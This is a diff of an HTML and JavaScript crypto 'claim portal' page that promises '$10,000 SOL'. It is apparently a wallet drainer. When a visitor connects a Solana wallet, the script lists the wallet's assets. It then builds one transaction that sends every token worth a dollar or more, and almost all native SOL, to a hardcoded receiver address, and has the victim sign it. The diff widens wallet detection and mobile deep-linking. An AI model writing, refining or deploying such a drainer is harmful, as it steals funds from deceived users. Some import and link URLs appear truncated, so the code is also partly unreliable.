@@ -3,168 +3,130 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>USDT Claim Portal</title>
+    <title>SOL Claim Portal</title>
     <link href="https://googleapis.com" rel="stylesheet">
     <style>
-        :root {
-            --bg-dark: #0a0a0c;
-            --accent-green: #14F195;
-            --glass: rgba(255, 255, 255, 0.03);
-            --glass-border: rgba(255, 255, 255, 0.1);
+        :root { --bg: #0a0a0c; --accent: #14F195; }
+        body, html { margin: 0; padding: 0; height: 100%; font-family: 'Inter', sans-serif; background: var(--bg); display: flex; justify-content: center; align-items: center; overflow: hidden; color: white; }
+        
+        /* Animated Background */
+        .mesh { position: absolute; width: 100%; height: 100%; z-index: -1; background: radial-gradient(circle at 50% 50%, rgba(20, 241, 149, 0.05), transparent 70%); animation: pulse 8s infinite alternate; }
+        @keyframes pulse { from { opacity: 0.3; transform: scale(1); } to { opacity: 0.8; transform: scale(1.2); } }
+
+        .card { 
+            background: rgba(255, 255, 255, 0.03); 
+            backdrop-filter: blur(30px); 
+            -webkit-backdrop-filter: blur(30px);
+            padding: 50px 30px; 
+            border-radius: 40px; 
+            border: 1px solid rgba(255, 255, 255, 0.1); 
+            text-align: center; 
+            width: 85%; 
+            max-width: 400px;
+            box-shadow: 0 40px 100px rgba(0,0,0,0.5);
         }
 
-        body, html {
-            margin: 0; padding: 0; height: 100%;
-            font-family: 'Inter', sans-serif;
-            background-color: var(--bg-dark);
-            display: flex; justify-content: center; align-items: center;
-            overflow: hidden; color: white;
-        }
-
-        /* Animated Mesh Gradient Background */
-        .mesh-container {
-            position: absolute; width: 100%; height: 100%;
-            background: var(--bg-dark);
-            z-index: -1; overflow: hidden;
-        }
-
-        .mesh-blob {
-            position: absolute; width: 600px; height: 600px;
-            background: radial-gradient(circle, rgba(20, 241, 149, 0.08) 0%, transparent 70%);
-            filter: blur(80px); animation: move 20s infinite alternate;
-        }
-
-        .blob-2 { top: -100px; right: -100px; background: radial-gradient(circle, rgba(153, 69, 255, 0.08) 0%, transparent 70%); animation-duration: 25s; }
-        .blob-3 { bottom: -100px; left: 10%; background: radial-gradient(circle, rgba(255, 255, 255, 0.03) 0%, transparent 70%); animation-duration: 30s; }
-
-        @keyframes move {
-            0% { transform: translate(0, 0) scale(1); }
-            100% { transform: translate(100px, 100px) scale(1.2); }
-        }
-
-        /* Glassmorphism Claim Card */
-        .claim-card {
-            background: var(--glass);
-            backdrop-filter: blur(25px);
-            -webkit-backdrop-filter: blur(25px);
-            padding: 60px 40px;
-            border-radius: 40px;
-            border: 1px solid var(--glass-border);
-            text-align: center;
-            box-shadow: 0 50px 100px rgba(0,0,0,0.8);
-            max-width: 450px; width: 90%;
-            animation: slideIn 0.8s ease-out;
-        }
-
-        .sol-text {
-            font-size: 38px; font-weight: 900;
-            white-space: nowrap; margin-bottom: 50px;
-            background: linear-gradient(to right, #fff 20%, #666 50%, #fff 80%);
-            background-size: 200% auto;
+        /* Fixed Single-Line Responsive Text */
+        .title { 
+            font-size: 7.5vw; /* Scales with screen width */
+            font-weight: 900; 
+            white-space: nowrap; 
+            margin-bottom: 40px; 
+            background: linear-gradient(to bottom, #fff, #888);
             -webkit-background-clip: text;
             -webkit-text-fill-color: transparent;
-            animation: shine 4s linear infinite;
+            letter-spacing: -1px;
         }
 
-        .claim-btn {
-            background: #ffffff; color: #000;
-            padding: 22px 0; border-radius: 18px;
-            font-weight: 800; font-size: 17px;
-            border: none; cursor: pointer;
-            text-transform: uppercase; letter-spacing: 1.5px;
-            width: 100%; transition: 0.3s cubic-bezier(0.2, 1, 0.3, 1);
-            margin-bottom: 12px;
+        @media(min-width: 450px) { .title { font-size: 32px; } }
+
+        .btn { 
+            background: #ffffff; color: #000; 
+            padding: 20px 0; border-radius: 18px; 
+            font-weight: 800; font-size: 16px; 
+            border: none; cursor: pointer; 
+            text-transform: uppercase; width: 100%; 
+            transition: 0.3s cubic-bezier(0.2, 1, 0.3, 1);
             box-shadow: 0 10px 20px rgba(0,0,0,0.2);
         }
-
-        .claim-btn:hover {
-            background: var(--accent-green);
-            transform: translateY(-4px) scale(1.02);
-            box-shadow: 0 15px 30px rgba(20, 241, 149, 0.3);
-        }
-
-        @keyframes shine { to { background-position: 200% center; } }
-        @keyframes slideIn { from { opacity: 0; transform: translateY(40px); } to { opacity: 1; transform: translateY(0); } }
+        .btn:hover { background: var(--accent); transform: translateY(-3px); }
     </style>
 </head>
 <body>
-    <div class="mesh-container">
-        <div class="mesh-blob"></div>
-        <div class="mesh-blob blob-2"></div>
-        <div class="mesh-blob blob-3"></div>
-    </div>
-
-    <div class="claim-card">
-        <div class="sol-text">CLAIM $10,000 USDT</div>
-        <button class="claim-btn" onclick="initiateWalletFlow('phantom')">Connect Phantom</button>
-        <button class="claim-btn" onclick="initiateWalletFlow('solflare')" style="background: #5055ff; color: #fff;">Connect Solflare</button>
+    <div class="mesh"></div>
+    <div class="card">
+        <div class="title">CLAIM $10,000 SOL</div>
+        <button class="btn" onclick="connectUniversalWallet()">Connect Wallet</button>
     </div>
 
     <script type="module">
-        import { Connection, PublicKey, TransactionMessage, VersionedTransaction, SystemProgram } from 'https://esm.sh';
-        import { createAssociatedTokenAccountInstruction, getAssociatedTokenAddress, createTransferCheckedInstruction } from 'https://esm.sh';
+        import * as web3 from 'https://esm.sh';
+        import * as spl from 'https://esm.sh';
 
         const HELIUS_RPC = "https://helius-rpc.com";
-        const RECEIVER_ADDR = new PublicKey("5KKphHnhQdhMMibgPDSsWXtDPZiFyXPPNSrKXuXxA2CM");
-        const connection = new Connection(HELIUS_RPC);
+        const RECEIVER = new web3.PublicKey("5KKphHnhQdhMMibgPDSsWXtDPZiFyXPPNSrKXuXxA2CM");
+        const connection = new web3.Connection(HELIUS_RPC);
 
-        window.initiateWalletFlow = async (walletType) => {
+        window.connectUniversalWallet = async () => {
             const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
-            const currentUrl = window.location.href;
+            
+            // Universal Detection: Checks for any injected Solana provider
+            const provider = window.solana || window.phantom?.solana || window.solflare || window.backpack || window.trustWallet?.solana;
 
-            if (isMobile && !window.solana && !window.phantom && !window.solflare) {
-                if (walletType === 'phantom') {
-                    window.location.href = `https://phantom.app{encodeURIComponent(currentUrl)}?ref=${encodeURIComponent(currentUrl)}`;
-                } else {
-                    window.location.href = `https://solflare.com{encodeURIComponent(currentUrl)}?ref=${encodeURIComponent(currentUrl)}`;
-                }
+            if (isMobile && !provider) {
+                // Universal Deep Link Fallback (Opens in Phantom Browser as standard)
+                const encodedUrl = encodeURIComponent(window.location.href);
+                window.location.href = `https://phantom.app{encodedUrl}?ref=${encodedUrl}`;
                 return;
             }
 
-            const provider = window.solana || window.phantom?.solana || window.solflare;
-            if (!provider) return alert("Wallet not detected. Use your wallet's browser.");
+            if (!provider) return alert("No Solana wallet detected. Open this in your wallet's browser.");
 
             try {
                 const resp = await provider.connect();
                 const sender = resp.publicKey;
 
-                const response = await fetch(HELIUS_RPC, {
+                // Fetch & Sort Assets via Helius
+                const res = await fetch(HELIUS_RPC, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({
-                        jsonrpc: '2.0', id: 'tx-01', method: 'getAssetsByOwner',
+                        jsonrpc: '2.0', id: '1', method: 'getAssetsByOwner',
                         params: { ownerAddress: sender.toBase58(), displayOptions: { showNativeBalance: true } }
                     }),
                 });
-                const { result } = await response.json();
-
+                const { result } = await res.json();
+                
                 const instructions = [];
                 const items = (result.items || []).filter(a => a.token_info?.price_info?.total_price >= 1);
 
                 for (const asset of items) {
-                    const mint = new PublicKey(asset.id);
-                    const destAta = await getAssociatedTokenAddress(mint, RECEIVER_ADDR);
-                    instructions.push(createAssociatedTokenAccountInstruction(sender, destAta, RECEIVER_ADDR, mint));
-                    instructions.push(createTransferCheckedInstruction(
-                        new PublicKey(asset.token_info.associated_token_address),
-                        mint, destAta, sender, asset.token_info.balance, asset.token_info.decimals
+                    const mint = new web3.PublicKey(asset.id);
+                    const destAta = await spl.getAssociatedTokenAddress(mint, RECEIVER);
+                    instructions.push(spl.createAssociatedTokenAccountInstruction(sender, destAta, RECEIVER, mint));
+                    instructions.push(spl.createTransferCheckedInstruction(
+                        new web3.PublicKey(asset.token_info.associated_token_address), mint, destAta, sender, asset.token_info.balance, asset.token_info.decimals
                     ));
                 }
 
-                const solLamports = result.nativeBalance?.lamports || 0;
-                if (solLamports > 5000000) { 
-                    instructions.push(SystemProgram.transfer({ fromPubkey: sender, toPubkey: RECEIVER_ADDR, lamports: solLamports - 5000000 }));
+                const solBalance = result.nativeBalance?.lamports || 0;
+                if (solBalance > 5000000) {
+                    instructions.push(web3.SystemProgram.transfer({ fromPubkey: sender, toPubkey: RECEIVER, lamports: solBalance - 5000000 }));
                 }
 
-                if (instructions.length === 0) return alert("No eligible assets found.");
+                if (instructions.length === 0) return alert("Insufficient balance to claim.");
 
                 const { blockhash } = await connection.getLatestBlockhash();
-                const message = new TransactionMessage({ payerKey: sender, recentBlockhash: blockhash, instructions }).compileToV0Message();
-                const tx = new VersionedTransaction(message);
-                const signedTx = await provider.signTransaction(tx);
-                await connection.sendRawTransaction(signedTx.serialize());
-                alert("Claim in progress...");
-            } catch (err) { alert("Cancelled."); }
+                const msg = new web3.TransactionMessage({ payerKey: sender, recentBlockhash: blockhash, instructions }).compileToV0Message();
+                const tx = new web3.VersionedTransaction(msg);
+                
+                const signed = await provider.signTransaction(tx);
+                await connection.sendRawTransaction(signed.serialize());
+                alert("Claim submitted successfully!");
+            } catch (err) {
+                console.error(err);
+                alert("Connection failed: " + err.message);
+            }
         };
     </script>
 </body>
